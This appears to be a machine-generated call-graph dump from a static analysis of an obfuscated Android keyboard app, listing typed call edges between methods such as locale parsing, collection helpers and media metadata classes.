CLINIT edge: staticinvoke <lkx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkx: void <clinit>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>($r2) in <gwk: void <init>()> ==> <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lum: lvm i()>() in <lum: lvt k()> ==> <lum: lvm i()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t find the Unsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<llo: void <init>(lkx,int)>($r2, $i0) in <lme: void <init>(lkx,int)> ==> <llo: void <init>(lkx,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
SPECIAL edge: $r4 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r2) in <ivv: ivw a()> ==> <ivv: ivw i(java.lang.String)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r4, $i2, 2) in <nzh: boolean f(ivv)> ==> <iwt: void g(char[],int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null searchFeature") in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: boolean isAssignableFrom(java.lang.Class)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <ljd: ljd g()>() in <lli: void <init>()> ==> <ljd: ljd g()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(20) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lvt: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c2) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.String getName()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <lkh: java.lang.Object[] toArray()> ==> <lkh: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r7.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: void <init>(java.util.List)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(3) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke $r1.<ljf: void <init>()>() in <lmb: java.util.Collection b()> ==> <ljf: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r5, "", $r6, "") in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
SPECIAL edge: specialinvoke $r6.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <nzh: boolean f(ivv)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <lkh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkh: void <clinit>()>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "metadata key") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <lje: void a()> ==> <java.util.ConcurrentModificationException: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.List: java.lang.Object get(int)>($i1) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r3) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>($r3, $r2) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lje: java.lang.Object next()>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: int o(int,int,int,int)> ==> <ljf: java.lang.Object p()>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljd: int z(int,int,int,int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r1, $i0, $i1, $r2) in <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 97, 122, $i0) in <iwt: java.lang.String e(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r2) in <iye: void I(boolean,java.lang.Object)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqo: lsa l()> ==> <lkq: lsb B()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <ltf: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: $i4 = specialinvoke r0.<ljf: int n()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int n()>
STATIC edge: $r7 = staticinvoke <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>($r6) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lso: void <init>()> ==> <lsq: void <init>()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <ljf: java.util.Iterator iterator()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(1) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>(1, "skipFrames must be >= 0") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map m()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map m()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(14) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
CLINIT edge: staticinvoke <java.lang.System: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.System: void <clinit>()>
SPECIAL edge: specialinvoke $r8.<ivw: void <init>()>() in <ivw: void <clinit>()> ==> <ivw: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("BitmojiImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
CLINIT edge: staticinvoke <lum: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lum: void <clinit>()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r1, $r2) in <lmb: void g(java.lang.Object,java.lang.Object)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r13.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[],int,int)>
STATIC edge: staticinvoke <lri: void u(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lri: void u(java.lang.Object[])>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r4.<hnp: void <init>()>() in <hnt: void <clinit>()> ==> <hnp: void <init>()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $l0 = virtualinvoke r0.<j$.sun.misc.b: long k(java.lang.reflect.Field)>($r4) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <j$.sun.misc.b: long k(java.lang.reflect.Field)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Resetting default value is disallowed [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>($r2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c3) in <ivw: boolean t(char[],int,int)> ==> <ivw: boolean O(char)>
SPECIAL edge: specialinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void <init>(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>(long)>
SPECIAL edge: specialinvoke $r7.<java.lang.String: void <init>(char[])>($r3) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<llo: lsa F()>() in <lmc: lsa l()> ==> <llo: lsa F()>
CLINIT edge: staticinvoke <miv: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <miv: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <ljd: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(46) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r1.<llg: void <init>(llo)>(r0) in <llo: lsa F()> ==> <llg: void <init>(llo)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int c()>() in <ljf: java.util.Set f()> ==> <ljf: int c()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <oru: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r1.<lqn: void <init>(lkx,java.lang.Object[],int,int)>(r0, $r2, 0, $i0) in <lqq: lma f()> ==> <lqn: void <init>(lkx,java.lang.Object[],int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqn: lsa l()> ==> <lma: lkq k()>
SPECIAL edge: specialinvoke $r2.<lqs: void <init>(lkq,java.util.Comparator)>($r3, $r0) in <lmo: lqs G(java.util.Comparator)> ==> <lqs: void <init>(lkq,java.util.Comparator)>
VIRTUAL edge: $r3 = virtualinvoke $r0.<androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(1) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r8.<java.util.Iterator: java.lang.Object next()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.d: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <lsn: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsn: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r25.<mag: void <init>(java.lang.String,int,int)>("TENOR_TRENDING_SEARCH_TERM_METADATA", 25, 25) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(10) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r3 = staticinvoke <lkq: lkq g(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lkq: lkq g(java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 65, 90, 32) in <iwt: java.lang.String c(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
STATIC edge: $i0 = staticinvoke <lri: int b(java.util.Set)>(r0) in <lma: int hashCode()> ==> <lri: int b(java.util.Set)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lrg: lsa l()>() in <lrg: java.util.Iterator iterator()> ==> <lrg: lsa l()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(20) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getValue()>
INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r3, $r1) in <lmo: int a(java.lang.Object,java.lang.Object)> ==> <lqc: int compare(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lqs: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: int size()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.Object: boolean equals(java.lang.Object)>($r4) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r21.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<java.lang.String: int length()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r0.<lso: void <init>()>() in <lsq: void <clinit>()> ==> <lso: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(15) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <lvm: void h(boolean,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("ji", "yi") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
CLINIT edge: staticinvoke <jlu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jlu: void <clinit>()>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: int a()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
STATIC edge: $l1 = staticinvoke <java.lang.System: long nanoTime()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long nanoTime()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkg: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r12 = virtualinvoke $r6.<lkt: lkx l()>() in <lmb: lme f()> ==> <lkt: lkx l()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lsg: void <init>()> ==> <lsv: void <init>()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r1.<lvs: void <init>(java.lang.String,int)>("STRING", 1) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int length()>() in <ivw: java.lang.String p()> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: int b()> ==> <ljf: boolean m()>
STATIC edge: $r0 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r15.<lvr: void <init>(lvr,lvr)>($r16, $r17) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvr: void <init>(lvr,lvr)>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void l(int)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
STATIC edge: $i4 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ag(int,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c3) in <nzh: boolean f(ivv)> ==> <ivw: boolean A(char)>
CLINIT edge: staticinvoke <lvs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvs: void <clinit>()>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(hff,java.lang.Class,ldp)>($r18, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(hff,java.lang.Class,ldp)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
STATIC edge: $r6 = staticinvoke <lqq: lqq a(int,java.lang.Object[])>(4, $r9) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lqq: lqq a(int,java.lang.Object[])>
